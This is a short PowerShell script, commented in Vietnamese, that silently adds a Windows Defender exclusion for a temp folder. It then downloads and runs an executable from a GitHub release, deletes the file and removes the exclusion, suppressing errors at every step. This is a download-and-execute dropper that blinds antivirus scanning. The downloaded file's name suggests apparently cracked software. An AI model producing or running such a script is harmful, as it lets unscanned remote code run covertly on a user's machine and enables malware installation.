# Thêm exclusion (không hiển thị chi tiết)
Add-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Local\Temp\MMTPC" -Force -ErrorAction SilentlyContinue

# Tải và chạy file
$filePath = "$env:USERPROFILE\AppData\Local\Temp\MMTPC\MMT.PE.exe"
Invoke-WebRequest -Uri "https://github.com/ghostminhtoan/private/releases/download/MMT/MMT.IDM.exe" -OutFile $filePath -ErrorAction SilentlyContinue

if (Test-Path $filePath) {
    Start-Process -FilePath $filePath -Wait
    Remove-Item $filePath -Force -ErrorAction SilentlyContinue
}

# Xóa exclusion (không hiển thị chi tiết)
Remove-MpPreference -ExclusionPath "$env:USERPROFILE\AppData\Local\Temp\MMTPC" -Force -ErrorAction SilentlyContinue


